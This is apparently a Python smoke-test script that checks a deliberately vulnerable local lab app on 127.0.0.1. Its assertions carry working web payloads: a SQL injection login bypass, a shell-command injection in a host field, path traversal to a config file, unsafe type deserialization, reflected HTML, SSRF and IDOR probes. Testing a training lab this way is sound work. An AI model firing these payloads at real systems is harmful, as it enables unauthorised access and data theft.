"""Exercise intentional flaws against the running local lab; no external targets."""
import json
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:5080"

def request(path, payload=None, query=None):
    if query:
        path += "?" + urllib.parse.urlencode(query)
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(BASE + path, data=data,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as response:
        return response.read().decode()

assert json.loads(request('/api/login', {'username': "admin' --", 'password': 'wrong'}))['role'] == 'admin'
assert 'LAB_COMMAND_MARKER' in request('/api/diagnostics', query={'host': 'localhost; printf LAB_COMMAND_MARKER'})
assert 'System.Version' in request('/api/import', {'$type': 'System.Version, System.Private.CoreLib', 'Major': 1, 'Minor': 2})
assert 'admin' in request('/api/users/filter', query={'expression': 'Role == "admin"'})
a = request('/api/crypto/encrypt', {'text': 'repeat this block'})
assert a == request('/api/crypto/encrypt', {'text': 'repeat this block'})
assert '5F4DCC3B5AA765D61D8327DEB882CF99' in request('/api/crypto/hash', {'text': 'password'})
assert 'LegacyReporting' in request('/api/files', query={'name': '../../appsettings.json'})
assert '<b>marker</b>' in request('/hello', query={'name': '<b>marker</b>'})
assert 'Service Portal' in request('/api/fetch', query={'url': BASE + '/'})
assert json.loads(request('/api/invoices/2'))['owner'] == 'bob'
assert len(json.loads(request('/api/reset-token'))['token']) == 6
print('Passed 11 local vulnerability smoke checks.')
